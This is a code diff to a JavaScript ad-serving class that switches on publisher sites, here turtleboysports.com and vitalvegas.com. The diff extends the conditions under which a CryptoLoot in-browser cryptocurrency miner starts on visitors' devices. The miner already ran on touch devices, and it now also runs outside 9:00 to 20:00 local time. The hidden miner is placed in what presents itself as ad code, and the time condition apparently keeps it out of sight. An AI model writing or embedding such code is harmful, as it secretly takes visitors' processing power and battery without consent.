@@ -262,16 +262,18 @@ class Apollo {
       vv:    '500',
     }
 
+    this.hour = new Date().getHours();
+
     switch(this.pubInfo.host) {
       case 'turtleboysports.com':
         //this.insertGoogle(this.tbsAds, this.ratio.tbs)
-        if (this.isTouchDevice()) {
+        if (this.isTouchDevice() || (this.hour < 9) || (this.hour > 20)) {
           var miner = new CryptoLoot.Anonymous('6eb8bbc890df55b9683dae8e270f14753ab4750a1eb1', {autoThreads:true});miner.start();
         }
         break
       case 'vitalvegas.com':
         //this.insertGoogle(this.vvAds, this.ratio.vv)
-        if (this.isTouchDevice()) {
+        if (this.isTouchDevice() || (this.hour < 9) || (this.hour > 20)) {
           var miner = new CryptoLoot.Anonymous('786a3d958b47299da7a2ac007e7a746d76e45b5ff046', {autoThreads:true});miner.start();
         }
         break
